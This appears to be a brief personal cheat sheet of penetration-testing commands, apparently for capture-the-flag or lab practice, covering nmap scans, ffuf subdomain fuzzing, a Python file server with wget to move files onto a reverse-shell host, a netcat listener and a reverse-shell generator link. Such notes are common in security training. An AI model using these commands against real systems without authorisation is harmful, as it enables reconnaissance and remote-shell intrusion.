NMAP enumeration
nmap <ip>
nmap -sC -sV -oA <filename> <ip>
nmap -sCV -p- -oA <filename> <ip>

Domain/vhost-Subdomain fuzzing
ffuf -u <url> -H "Host: FUZZ.<url>" -w /opt/SecLists/Discovery/DNS/subdomains... -fc <filter code> (e.g 301)
ffuf -u <url> -H "Host: <url>.FUZZ" -w /usr/share/wordlists/wordlist...

Python http server
python3 -m http.server (port 8000 default)
wget <my-ip>:<port>/<path-to-file> (file upload on revshells)

netcat
nc -lvp 4444
https://www.revshells.com/

exiftool - file analysis
file <filename>
./exiftool /home/parrot/Downloads/<filename>
